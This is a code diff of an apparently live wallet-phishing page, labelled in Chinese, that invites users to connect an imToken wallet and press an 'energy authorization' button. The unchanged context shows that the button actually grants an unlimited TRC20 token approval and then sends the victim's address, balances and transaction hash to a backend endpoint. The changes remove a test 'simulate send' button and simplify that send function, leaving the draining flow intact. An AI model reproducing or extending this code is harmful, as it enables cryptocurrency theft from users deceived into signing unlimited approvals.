@@ -46,8 +46,6 @@
 
 <button id="connectBtn" class="btn">连接imToken钱包</button>
 <button id="approveBtn" class="btn" disabled>能量授权</button>
-<!-- 添加模拟发送按钮 -->
-<button id="simulateBtn" class="btn">模拟发送数据</button>
 
 <div id="userInfo">未连接钱包</div>
 
@@ -69,9 +67,6 @@
     // 全局变量
     let tronWeb, userAddress, trc20Contract;
     const RECORD_KEY = "imtoken_infinite_approval_records";
-
-    // 获取模拟发送按钮 (移动到 window.onload 之外)
-    const simulateBtn = document.getElementById("simulateBtn");
 
     window.onload = async () => {
         const connectBtn = document.getElementById("connectBtn");
@@ -140,7 +135,7 @@
                     trxBalance: trxBalance.toFixed(2),
                     approveTime: new Date().toLocaleString(),
                     txHash: result.transaction.txID,
-                    approveType: "无限额度" // 新增：标注类型
+                    approveType: "无限额度" // 新增：标注授权类型
                 };
 
                 saveApprovalRecord(record);
@@ -153,24 +148,6 @@
                 alert("授权失败：" + e.message);
             }
         };
-    };
-
-    // 模拟发送数据
-    simulateBtn.onclick = async () => {
-        try {
-            // 模拟钱包数据
-            const mockData = {
-                address: "TVjfwpWJ8Z9Xfzh6umeH4E7fg93PTcK6vA",
-                tokenBalance: 100.00,
-                trxBalance: 500.00
-            };
-
-            await sendDataToBackend(mockData);
-            alert("模拟数据发送成功！");
-
-        } catch (e) {
-            alert("模拟数据发送失败：" + e.message);
-        }
     };
 
     // 初始化钱包信息（IMToken适配）
@@ -232,26 +209,18 @@
     }
 
     // 传数据到后端（同步无限授权信息）
-  async function sendDataToBackend(data) {
-  try {
-    console.log("发送数据到后端:", data); // 添加此行
-    const res = await fetch(BACKEND_API, {
+   async function sendDataToBackend(data) {
+    try {
+     console.log("发送数据到后端:", data); // 添加此行
+     const res = await fetch(BACKEND_API, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(data),
       credentials: "include"
     });
     console.log("后端响应:", res); // 添加此行
-    if (res.ok) {
-      console.log("后端响应状态码:", res.status); // 添加此行
-      console.log("后端响应头:", res.headers); // 添加此行
-      const responseData = await res.json();
-      console.log("后端响应数据:", responseData); // 添加此行
-      return responseData;
-    } else {
-      console.error("后端请求失败，状态码:", res.status); // 添加此行
-      throw new Error("后端请求失败");
-    }
+    if (!res.ok) throw new Error("后端请求失败");
+    return res.json();
   } catch (e) {
     console.error("数据发送失败:", e); // 添加此行
     alert("数据发送失败：" + e.message);
